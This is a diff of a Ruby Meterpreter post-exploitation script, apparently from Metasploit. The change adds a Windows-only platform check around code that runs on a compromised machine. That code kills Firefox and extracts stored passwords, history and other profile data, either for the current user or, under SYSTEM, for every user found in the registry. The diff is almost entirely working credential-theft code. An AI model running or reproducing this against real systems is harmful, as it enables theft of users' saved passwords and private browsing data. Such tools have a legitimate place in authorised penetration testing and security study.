@@ -249,34 +249,38 @@ end
 		kill_frfx = true
 	end
 }
-
-if frfxchk
-	user = @client.sys.config.getuid
-	if user != "NT AUTHORITY\\SYSTEM"
-		usrname = @client.fs.file.expand_path("%USERNAME%")
-		db_path = @client.fs.file.expand_path("%APPDATA%") + "\\Mozilla\\Firefox\\Profiles"
-		if kill_frfx
-			kill_firefox
-		end
-		print_status("Extracting Firefox data for user #{usrname}")
-		frfxpswd(db_path,usrname)
-		frfxplacesget(db_path,usrname)
-		frfxdmp(usrname)
-	else
-		registry_enumkeys("HKU").each do |sid|
-			if sid =~ /S-1-5-21-\d*-\d*-\d*-\d{4}$/
-				key_base = "HKU\\#{sid}" 
-				usrname = registry_getvaldata("#{key_base}\\Volatile Environment","USERNAME")
-				db_path = registry_getvaldata("#{key_base}\\Volatile Environment","APPDATA") + "\\Mozilla\\Firefox\\Profiles"
-				if kill_frfx
-					kill_firefox
+if client.platform =~ /win32|win64/
+	if frfxchk
+		user = @client.sys.config.getuid
+		if user != "NT AUTHORITY\\SYSTEM"
+			usrname = @client.fs.file.expand_path("%USERNAME%")
+			db_path = @client.fs.file.expand_path("%APPDATA%") + "\\Mozilla\\Firefox\\Profiles"
+			if kill_frfx
+				kill_firefox
+			end
+			print_status("Extracting Firefox data for user #{usrname}")
+			frfxpswd(db_path,usrname)
+			frfxplacesget(db_path,usrname)
+			frfxdmp(usrname)
+		else
+			registry_enumkeys("HKU").each do |sid|
+				if sid =~ /S-1-5-21-\d*-\d*-\d*-\d{4}$/
+					key_base = "HKU\\#{sid}"
+					usrname = registry_getvaldata("#{key_base}\\Volatile Environment","USERNAME")
+					db_path = registry_getvaldata("#{key_base}\\Volatile Environment","APPDATA") + "\\Mozilla\\Firefox\\Profiles"
+					if kill_frfx
+						kill_firefox
+					end
+					print_status("Extracting Firefox data for user #{usrname}")
+					frfxpswd(db_path,usrname)
+					frfxplacesget(db_path,usrname)
+					frfxdmp(usrname)
 				end
-				print_status("Extracting Firefox data for user #{usrname}")
-				frfxpswd(db_path,usrname)
-				frfxplacesget(db_path,usrname)
-				frfxdmp(usrname)
 			end
 		end
-	end
 
+	end
+else
+	print_error("This version of Meterpreter is not supported with this Script!")
+	raise Rex::Script::Completed
 end
